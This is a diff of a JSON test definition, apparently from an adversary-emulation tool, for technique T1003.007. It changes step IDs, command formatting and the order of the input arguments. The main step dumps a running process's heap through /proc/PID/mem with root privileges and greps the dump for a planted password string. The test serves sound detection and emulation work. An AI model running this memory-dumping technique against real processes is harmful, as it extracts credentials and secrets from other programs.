@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "63c6d1a0-dcce-422c-a25d-be981495403d",
+      "id": "5b6b63a0-c369-4d6e-8e37-334665e20d42",
       "type": "execute-command",
       "data": {
-        "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n",
+        "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "8722e849-c6f6-47d9-a4f3-f41b5f2de4c9",
+      "id": "f7f3a082-f055-4601-a07a-c05521b5277a",
       "type": "execute-command",
       "data": {
-        "command": "rm -f \"#{output_file}\"\n",
+        "command": "rm -f \"#{output_file}\"",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "a38b8de2-495e-4d68-949c-46d298caee52",
+      "id": "b2f6aed3-c7f4-4d24-9300-a38a71507556",
       "name": "Check dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
       "data": {
-        "command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
-        "command_type": ""
+        "command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "90a078d8-7076-4eca-941c-38d44f863937",
+      "id": "9d3de7fb-39e7-4e51-80c6-7e6bda900432",
       "name": "Resolve dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
       "data": {
-        "command": "echo '#!/bin/sh' \u003e #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" \u0026\u0026 sleep 30' \u0026\" \u003e\u003e #{script_path}\n",
-        "command_type": ""
+        "command": "echo '#!/bin/sh' \u003e #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" \u0026\u0026 sleep 30' \u0026\" \u003e\u003e #{script_path}",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "dc1b2e1a-70f4-4e0d-bc22-e0f4ba754697",
+      "id": "0dea4e88-e341-4ed9-b047-527f200c23aa",
       "name": "Re-check dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
       "data": {
-        "command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
-        "command_type": ""
+        "command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}",
+        "command_type": "sh"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "63c6d1a0-dcce-422c-a25d-be981495403d",
+      "s": "5b6b63a0-c369-4d6e-8e37-334665e20d42",
       "p": "on-success",
-      "o": "8722e849-c6f6-47d9-a4f3-f41b5f2de4c9"
+      "o": "f7f3a082-f055-4601-a07a-c05521b5277a"
     },
     {
-      "s": "63c6d1a0-dcce-422c-a25d-be981495403d",
+      "s": "5b6b63a0-c369-4d6e-8e37-334665e20d42",
       "p": "on-failure",
-      "o": "8722e849-c6f6-47d9-a4f3-f41b5f2de4c9"
+      "o": "f7f3a082-f055-4601-a07a-c05521b5277a"
     },
     {
-      "s": "a38b8de2-495e-4d68-949c-46d298caee52",
+      "s": "b2f6aed3-c7f4-4d24-9300-a38a71507556",
       "p": "on-success",
-      "o": "63c6d1a0-dcce-422c-a25d-be981495403d"
+      "o": "5b6b63a0-c369-4d6e-8e37-334665e20d42"
     },
     {
-      "s": "a38b8de2-495e-4d68-949c-46d298caee52",
+      "s": "b2f6aed3-c7f4-4d24-9300-a38a71507556",
       "p": "on-failure",
-      "o": "90a078d8-7076-4eca-941c-38d44f863937"
+      "o": "9d3de7fb-39e7-4e51-80c6-7e6bda900432"
     },
     {
-      "s": "90a078d8-7076-4eca-941c-38d44f863937",
+      "s": "9d3de7fb-39e7-4e51-80c6-7e6bda900432",
       "p": "on-success",
-      "o": "dc1b2e1a-70f4-4e0d-bc22-e0f4ba754697"
+      "o": "0dea4e88-e341-4ed9-b047-527f200c23aa"
     },
     {
-      "s": "dc1b2e1a-70f4-4e0d-bc22-e0f4ba754697",
+      "s": "0dea4e88-e341-4ed9-b047-527f200c23aa",
       "p": "on-failure",
-      "o": "63c6d1a0-dcce-422c-a25d-be981495403d"
+      "o": "5b6b63a0-c369-4d6e-8e37-334665e20d42"
     }
   ],
   "tags": [
@@ -95,6 +95,12 @@
     "T1003.007"
   ],
   "input_arguments": [
+    {
+      "name": "output_file",
+      "type": "path",
+      "description": "Path where captured results will be placed",
+      "value": "/tmp/T1003.007.bin"
+    },
     {
       "name": "script_path",
       "type": "path",
@@ -106,12 +112,6 @@
       "type": "string",
       "description": "Unique string to use to identify target process",
       "value": "T1003.007"
-    },
-    {
-      "name": "output_file",
-      "type": "path",
-      "description": "Path where captured results will be placed",
-      "value": "/tmp/T1003.007.bin"
     }
   ]
 }
